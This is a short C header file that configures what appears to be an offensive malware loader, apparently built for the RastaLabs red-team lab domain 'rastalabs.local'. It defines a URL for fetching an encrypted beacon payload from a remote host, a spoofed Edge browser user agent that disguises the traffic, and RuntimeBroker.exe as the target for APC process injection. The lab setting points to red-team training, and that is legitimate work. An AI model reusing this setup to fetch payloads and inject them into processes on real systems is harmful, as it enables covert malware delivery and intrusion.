#pragma once

#ifdef _DEBUG
	#define DEBUG_PRINT(fmt, ...) printf("[DEBUG]: " fmt, __VA_ARGS__)
#else
	#define DEBUG_PRINT(fmt, ...)
#endif

#define SECURITY_WIN32

#define PAYLOADURL L"http://192.168.43.128:8888/beacon-enc.bin"
#define USERAGENT L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0"
#define domainName "rastalabs.local"

#define APCINJECT_PROCESS "RuntimeBroker.exe"